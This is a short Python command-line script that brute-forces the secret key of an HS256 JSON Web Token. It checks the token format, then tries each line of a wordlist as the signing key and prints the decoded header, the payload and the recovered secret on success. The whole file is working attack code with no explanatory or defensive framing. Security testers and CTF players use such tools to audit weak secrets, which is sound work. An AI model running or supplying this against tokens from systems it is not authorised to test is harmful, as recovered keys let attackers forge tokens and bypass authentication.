import sys,jwt

"""
Check if the given data is HS256 JWT
"""
def is_jwt(token):
	try:
		splitted_token = token.split('.')
		if len(splitted_token) != 3:
			return False
	except:
		return False
	try:
		typ = jwt.get_unverified_header(token).get('typ').lower()
		alg = jwt.get_unverified_header(token).get('alg').lower()
		if typ == "jwt" and alg == "hs256":
			return True
		else:
			return False
	except:
		return False

"""
JWT Brute Forcing
"""
def crack_jwt(token, secrets_list):
	try:
		list_of_secrets = open(secrets_list, 'r')
	except:
		print("Could not open the file " + secrets_list)
		sys.exit()
	secrets = list_of_secrets.readlines()
	for secret in secrets:
		try:
			data = jwt.decode(token, secret.strip(), algorithms="HS256")
			print("\n")
			print("HEADER")
			print("-----------")
			print(jwt.get_unverified_header(token))
			print("\n")
			print("DATA")
			print("-----------")
			print(data)
			print("\n")
			print("SECRET KEY: " + secret)
			list_of_secrets.close()
			sys.exit()
		except jwt.exceptions.InvalidSignatureError:
			continue
	print("Could not find any secret key from the " + secrets_list)
	list_of_secrets.close()
	sys.exit()

"""
MAIN
"""
secrets_list = sys.argv[1]
token = sys.argv[2]
if is_jwt(token):
	crack_jwt(token, secrets_list)
else:
	print("Please enter valid JWT with HS256 algorithm")
	sys.exit()